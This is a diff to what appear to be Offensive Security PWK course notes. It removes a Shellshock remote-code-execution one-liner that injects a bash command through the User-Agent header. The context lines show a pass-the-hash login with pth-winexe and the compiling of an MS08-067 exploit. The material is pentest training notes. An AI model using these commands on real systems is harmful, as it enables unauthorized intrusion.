@@ -95,10 +95,6 @@ Offsec PWK notes and frecuently used files.
     pth-winexe -U john //1.1.1.1 cmd 
 
 
-<h4>Shellshock RCE</h4>
-
-    curl http://1.1.1.1/cgi-bin/admin.cgi -H"User-Agent:() { :; }; /bin/bash -c ifconfig “
-
 <h4>Compiling .exe Files with mingw32</h4>
 
     i586-mingw32msvc-gcc MS08-067.c -o MS08-067.exe  -lrpcrt4 -lws2_32 -lwsock32 -lmpr
